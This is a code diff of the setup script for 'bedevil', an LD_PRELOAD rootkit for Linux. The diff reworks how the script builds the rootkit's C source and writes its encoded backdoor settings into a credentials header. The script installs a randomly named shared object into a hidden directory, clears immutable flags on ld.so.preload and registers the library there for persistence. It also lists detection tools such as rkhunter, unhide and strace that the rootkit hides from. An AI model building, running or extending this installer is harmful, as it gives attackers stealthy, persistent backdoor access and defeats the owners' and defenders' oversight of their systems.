@@ -7,16 +7,10 @@ BDVLC="bdvl.c" # main C file to write to
 BDVLSO="`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 12 | head -n1`.so" # shared object to create
 MDIR="modules"
 NEW_MDIR="awesome_modules"
-PHOOKC="$NEW_MDIR/prehook.c" # contains constructor and destructor
-CREDFILE="$NEW_MDIR/headers/rk_creds.h"
 LIBHOOKS="$NEW_MDIR/lib_hooks"
-XK='AC'
 PLATFORM="`uname -m`"
 
 CFILES=(".ascii" "etc/ssh.sh") # local static files to copy over to the install dir
-
-SINCLUDES="$MDIR/std_includes"
-MINCLUDES="$MDIR/module_includes"
 
 # default variables for certain settings.
 # these can/will be changed during setup.
@@ -32,9 +26,9 @@ declare -a array HOOKS=()
 # a list of processes/binaries to hide from
 declare -a array HPROCS=("lsrootkit" "ldd" "unhide" "rkhunter" "chkproc" "chkdirs" "ltrace" "strace" "LD_AUDIT")
 
+clear # looks pretty (and there's now a considerable amount of output from this script)
 if [ -f ".ascii" ]; then
     NICEASCII="`cat .ascii`"
-    clear # looks pretty. only clear if showing ascii
     printf "\e[1m\e[31m$NICEASCII\e[0m\n"
 fi
 
@@ -158,7 +152,27 @@ writechrs()
     [ ! -d "$NEW_MDIR" ] && return
     echo " [..] Building & writing C char arrays for the lib headers"
     spefhooks="$(glibhooks)"
-    printf "${spefhooks//\\x/\\\\x}\n#endif" >> $CREDFILE
+    printf "${spefhooks//\\x/\\\\x}\n#endif" >> $NEW_MDIR/headers/rk_creds.h
+}
+
+# see 'modules/stconsts'
+writesconsts()
+{
+    sed -i 's/\r$//g' $NEW_MDIR/stconsts # lol windows
+	local stconsts="`cat $NEW_MDIR/stconsts | grep -o '^[^#]*'`"
+	local cconsts=""
+
+	echo " [..] Parsing stconsts"
+	while read -r line; do # go line by line
+		IFS=':' read -a pline <<< "$line" # seperate name and value on line
+		cname=${pline[0]} # const name
+		cval=${pline[1]} # const value
+		[ $cval == $cname ] && cconsts+="#define $cname \"`xenc ${!cval}`\"\n" # reference variable in this script by the const value
+		[ $cval != $cname ] && cconsts+="#define $cname \"`xenc $cval`\"\n" # we already have a suitable value, use that
+	done <<< "$stconsts"
+
+	printf "\n$cconsts\n" >> $NEW_MDIR/headers/rk_creds.h
+	echo " [+] Finished parsing stconsts."
 }
 
 # $1 = plaintext pwd
@@ -168,9 +182,7 @@ guserpwd()
         echo -n `python3 -c "import crypt;print(crypt.crypt('$1'))"` # python's crypt function generates a salt of 16 random chars
         return
     fi
-    # hence i'm by default making your salt a random set of 16 chars here
-    # if you don't have python3. as far as i know, most boxes that aren't ARM
-    # can use openssl's -6 algorithm below.
+    # as far as i know, most boxes that aren't ARM can use openssl's -6 algorithm below.
     echo -n $(openssl passwd -6 -salt `cat /dev/urandom | tr -dc 'A-Za-z0-9' | fold -w 16 | head -n1` $1)
 }
 
@@ -205,8 +217,6 @@ start_config_wizard()
         RAND_VALUE="`cat /dev/urandom | tr -dc 'a-zA-Z' | fold -w 8 | head -n1`"
         [[ "$var" == *"IDIR"* ]] && RAND_VALUE=$IDIR
         [[ "$var" == *"BD_ENV"* ]] && RAND_VALUE=$BD_ENV
-        [[ "$var" == *"LDSO_PRELOAD"* ]] && RAND_VALUE=$LDSO_PRELOAD
-        [[ "$var" == *"SOPATH"* ]] && RAND_VALUE="$IDIR/$BDVLSO.$PLATFORM" # this should run after (if) IDIR has been changed
 
         read -p " [..] Variable input for ${var//\?} [$RAND_VALUE]: "
         if [ ! -z $REPLY ]; then
@@ -218,7 +228,6 @@ start_config_wizard()
             PSETTINGS+="\"`xenc $REPLY`\":$var "
             [[ "$var" == *"IDIR"* ]] && eval IDIR="$REPLY"
             [[ "$var" == *"BD_ENV"* ]] && eval BD_ENV="$REPLY"
-            [[ "$var" == *"LDSO_PRELOAD"* ]] && eval LDSO_PRELOAD="$REPLY"
         else
             if [[ "$var" == *"BD_PWD"* ]]; then
               PSETTINGS+="\"`xenc $(guserpwd $RAND_VALUE)`\":$var "
@@ -243,8 +252,8 @@ start_config_wizard()
         fi
     done
 
+    SOPATH="$IDIR/$BDVLSO.$PLATFORM"
     printf "\n [+] Config wizard finished.\n\n"
-
     verb $PSETTINGS
 }
 
@@ -278,7 +287,7 @@ gather_user_settings()
 
 c_includes()
 {
-    _inc="`cat $SINCLUDES | grep -o '^[^#]*' && cat $MINCLUDES | grep -o '^[^#]*'`"
+    _inc="`cat "$MDIR/std_includes" | grep -o '^[^#]*' && cat "$MDIR/module_includes" | grep -o '^[^#]*'`"
     while read -r line; do echo "#include $line"; done <<< "$_inc"
 }
 
@@ -298,12 +307,10 @@ find_pholders()
     verb "${STR_VARS[@]} ${INT_VARS[@]}"
 }
 
-# 1st arg = file location of current header in which we will be overwriting variable placeholders.
-# so while we're going through every header, we're gonna try see if we can overwrite all the placeholders we know with our new variables.
+# $1 = file location of current header.
 # we don't know what placeholders are in which files, but we do know what placeholders exist, so we can kinda just bruteforce our new stuff in.
-# there's probably a more efficient way of doing this rofl, but unless we're looking at lots of headers we should be gucci.
-# this is done by using $PSETTINGS. $PSETTINGS is laid out like the following: NEW_VALUEX:??OLD_PLACEHOLDER??
-# this was meant to be one of my final goals. and it was one of the first things i done.
+# there's probably a more efficient way of doing this, but unless we're looking at lots of headers we should be gucci.
+# this is done using $PSETTINGS. i.e.(a list of): NEW_VALUEX:??OLD_PLACEHOLDER??
 overwrite_pholders()
 {
     CPHOLDER=$1
@@ -337,12 +344,12 @@ populate_new_pholders()
         fi
     fi
 
-    echo " [..] Copying '$MDIR' to '$NEW_MDIR'"
     # copy module directory to new directory
 	cp -r $MDIR/ $NEW_MDIR/ || { echo " [!] Aborting '${FUNCNAME[0]}' - Couldn't copy module directory."; return; }
 
     writechrs # write char arrays
     gather_user_settings
+    writesconsts # write mandatory background consts
 
     echo " [..] Overwriting variable placeholders with new settings"
     # now PSETTINGS definitely exists, we can start parsing it for variables and replacing old placeholders
@@ -364,7 +371,7 @@ build_bdvlc()
     [ -f $BDVLC ] && echo " [..] $BDVLC exists already. It will be overwritten."
     _BDVLC="#define _GNU_SOURCE
 `c_includes`
-`cat $PHOOKC`"
+`cat "$NEW_MDIR/prehook.c"`"
     echo "$_BDVLC" > $BDVLC
 }
 
@@ -459,17 +466,16 @@ install_bdvl()
     compile_bdvl # after this, bdvl.so.* will now exist in the cwd
 
     export ${BD_ENV}=1
-    SO_PATH="$IDIR/$BDVLSO.$PLATFORM" # we initialize this now, since the variables may have been changed up until now
     
     # now we have to install the library and make sure it is present in ld.so.preload
-    echo " [+] Installing $BDVLSO to $SO_PATH and loading into $LDSO_PRELOAD"
+    echo " [+] Installing $BDVLSO to $SOPATH and loading into $LDSO_PRELOAD"
     rm -rf $IDIR/
     mkdir -p $IDIR/
 
-    cp $BDVLSO.$PLATFORM $SO_PATH
+    cp $BDVLSO.$PLATFORM $SOPATH
     cp $BDVLSO.i686 $IDIR/$BDVLSO.i686 2>/dev/null
     [ -f "$LDSO_PRELOAD" ] && chattr -ia $LDSO_PRELOAD &>/dev/null
-    echo -n $SO_PATH > $LDSO_PRELOAD
+    echo -n $SOPATH > $LDSO_PRELOAD
     echo " [+] bedevil has been installed on the machine."
     cleanup_bdvl
     echo
@@ -540,4 +546,4 @@ while getopts "h?vdfpcCbiD" opt; do
     esac
 done
 
-show_help
+[ -z $1 ] && show_help
